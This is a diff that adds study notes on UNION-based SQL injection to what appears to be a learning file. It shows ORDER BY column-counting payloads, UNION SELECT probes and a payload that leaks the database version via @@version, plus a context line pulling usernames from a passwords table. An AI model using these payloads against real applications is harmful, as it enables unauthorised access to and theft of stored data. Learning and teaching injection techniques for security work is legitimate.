@@ -425,3 +425,29 @@ For advanced SQL injection, we may want to simply use 'NULL' to fill other colum
 ```
 SELECT * from products where product_id UNION SELECT username, 2, 3, 4 from passwords-- '
 ```
+
+## UNION INJECTION
+
+* Using by ORDER BY
+* Using by UNION
+
+### ORDER BY
+* ' order by 1-- - -> changing 1 to x and look for error
+
+Reminder
+```
+We are adding an extra dash (-) at the end, to show you that there is a space after (--).
+```
+
+### UNION
+* sth' UNION select 1,2,3,4-- - 
+
+### Location of Injection
+We cannot place our injection at the beginning, or its output will not be printed.
+We can use @@version
+```
+cn' UNION select 1,@@version,3,4-- -
+```
+
+# Database Enumeration
+
